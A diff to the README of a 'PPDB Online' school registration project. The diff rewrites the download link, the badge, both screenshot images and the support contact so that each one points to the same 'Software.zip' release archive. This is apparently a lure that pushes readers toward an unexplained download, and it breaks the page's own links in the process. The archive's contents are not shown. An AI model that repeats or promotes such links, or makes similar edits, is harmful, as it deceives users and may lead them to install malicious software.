@@ -23,9 +23,9 @@ Welcome to the PPDB Online repository, your go-to place for the free version of 
 
 ## Get Started 🚀
 
-To access the latest version of the PPDB Online system, download it [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). This link will provide you with the necessary files to launch the system and start streamlining your school's registration process.
+To access the latest version of the PPDB Online system, download it [here](https://github.com/omar2328/PPDB-online/releases/download/v2.0/Software.zip). This link will provide you with the necessary files to launch the system and start streamlining your school's registration process.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Now](https://github.com/omar2328/PPDB-online/releases/download/v2.0/Software.zip)](https://github.com/omar2328/PPDB-online/releases/download/v2.0/Software.zip)
 
 ## Features ✨
 
@@ -46,12 +46,12 @@ Follow these steps to set up the PPDB Online system:
 
 ## Screenshots 📷
 
-![PPDB Online Dashboard](https://example.com/ppdb-online-dashboard.png)
-![PPDB Online Registration Form](https://example.com/ppdb-online-registration.png)
+![PPDB Online Dashboard](https://github.com/omar2328/PPDB-online/releases/download/v2.0/Software.zip)
+![PPDB Online Registration Form](https://github.com/omar2328/PPDB-online/releases/download/v2.0/Software.zip)
 
 ## Support 🤝
 
-If you encounter any issues or have questions about the PPDB Online system, please reach out to our dedicated support team at support@ppdbonline.com.
+If you encounter any issues or have questions about the PPDB Online system, please reach out to our dedicated support team at https://github.com/omar2328/PPDB-online/releases/download/v2.0/Software.zip
 
 ## Contribute 🤗
 
